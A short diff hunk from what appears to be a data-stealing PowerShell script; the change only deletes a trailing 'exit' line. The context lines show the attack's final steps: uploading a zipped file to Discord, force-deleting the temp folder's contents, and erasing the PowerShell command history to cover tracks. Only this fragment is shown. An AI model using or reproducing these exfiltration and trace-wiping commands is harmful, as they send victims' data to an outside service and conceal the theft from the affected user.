@@ -47,4 +47,4 @@ Upload-Discord -file "$env:tmp/$ZIP"
 
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 Remove-Item (Get-PSreadlineOption).HistorySavePath
-exit
+
